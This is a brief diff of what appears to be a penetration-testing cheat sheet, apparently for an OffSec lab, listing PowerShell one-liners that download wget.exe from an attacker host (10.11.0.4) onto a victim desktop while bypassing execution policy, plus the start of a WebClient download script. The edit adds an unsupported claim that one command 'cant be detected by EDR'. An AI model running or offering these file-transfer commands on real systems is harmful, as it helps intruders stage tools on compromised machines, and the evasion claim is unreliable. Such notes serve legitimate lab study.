@@ -5,7 +5,7 @@ https://www.file.io/
 ```
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')" 
 powershell -NoProfile -ExecutionPolicy Bypass -NoLogo -NonInteractive -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
-powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1(Cant be detected by EDR)
 
 d_f.ps1
 $webclient = New-Object System.Net.WebClient
